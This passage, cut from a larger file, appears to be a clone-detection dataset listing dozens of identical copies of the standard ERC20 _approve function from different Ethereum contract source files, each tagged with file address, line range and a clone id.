        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="101" endline="110" pcid="2663">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="98" endline="107" pcid="2648">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="96" endline="105" pcid="7316">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="100" endline="109" pcid="3393">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="99" endline="108" pcid="5945">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="102" endline="111" pcid="8474">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="100" endline="109" pcid="9366">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="100" endline="109" pcid="9351">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="100" endline="109" pcid="3431">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="100" endline="109" pcid="3446">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="98" endline="107" pcid="7301">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="99" endline="108" pcid="8096">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="99" endline="108" pcid="9336">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="107" endline="116" pcid="2308">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="97" endline="106" pcid="3461">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="97" endline="106" pcid="3476">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="100" endline="109" pcid="3491">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="424" endline="433" pcid="9318">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="99" endline="108" pcid="2293">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="85" endline="94" pcid="3504">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="160" endline="169" pcid="3519">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="93" endline="102" pcid="3534">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="95" endline="104" pcid="9297">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="101" endline="110" pcid="7255">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="100" endline="109" pcid="809">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="97" endline="106" pcid="9282">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="99" endline="108" pcid="2272">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="97" endline="106" pcid="7507">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="100" endline="109" pcid="6675">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="98" endline="107" pcid="3554">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="93" endline="102" pcid="1631">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="100" endline="109" pcid="3569">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="99" endline="108" pcid="3584">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="101" endline="110" pcid="2253">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="100" endline="109" pcid="4952">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="99" endline="108" pcid="312">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="100" endline="109" pcid="3602">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="102" endline="111" pcid="3625">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="96" endline="105" pcid="8369">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="100" endline="109" pcid="9234">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="93" endline="102" pcid="2238">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="98" endline="107" pcid="3654">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="98" endline="107" pcid="5580">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="99" endline="108" pcid="3672">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="96" endline="105" pcid="9212">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="716" endline="725" pcid="2219">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="98" endline="107" pcid="3717">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="100" endline="109" pcid="4215">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="96" endline="105" pcid="1465">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="100" endline="109" pcid="6571">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="100" endline="109" pcid="4422">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="98" endline="107" pcid="7462">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="100" endline="109" pcid="6616">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="97" endline="106" pcid="538">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="100" endline="109" pcid="7522">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="100" endline="109" pcid="1851">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="101" endline="110" pcid="4352">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="100" endline="109" pcid="4665">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="97" endline="106" pcid="5097">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="100" endline="109" pcid="7072">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="96" endline="105" pcid="6753">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="100" endline="109" pcid="5565">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="98" endline="107" pcid="6339">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="101" endline="110" pcid="453">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="99" endline="108" pcid="5788">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="99" endline="108" pcid="4973">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="96" endline="105" pcid="101">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="96" endline="105" pcid="4051">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="99" endline="108" pcid="6094">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="111" endline="120" pcid="2155">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="101" endline="110" pcid="6506">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="93" endline="102" pcid="9080">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="97" endline="106" pcid="8901">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="105" endline="114" pcid="5854">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="96" endline="105" pcid="7824">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="94" endline="103" pcid="3732">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="100" endline="109" pcid="6900">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="100" endline="109" pcid="7581">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
